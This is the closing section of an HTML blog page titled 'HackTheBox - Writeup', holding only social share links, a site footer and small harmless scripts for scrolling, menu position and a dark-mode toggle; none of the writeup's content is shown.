<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Writeup on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-writeup%2f&title=HackTheBox%20-%20Writeup"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Writeup on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-writeup%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Writeup on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Writeup%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-writeup%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Writeup on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Writeup&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-writeup%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<script>var toc=document.getElementsByClassName('inner')[0],pTag=document.getElementsByClassName('post-meta')[0],fromTop=pTag.getBoundingClientRect().top,fromBottom=pTag.getBoundingClientRect().bottom;document.addEventListener('scroll',function(b){let a=document.documentElement.scrollTop+75;a>fromTop?(toc.style.visibility='visible',toc.style.opacity='1'):(toc.style.visibility='hidden',toc.style.opacity='0')})</script>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>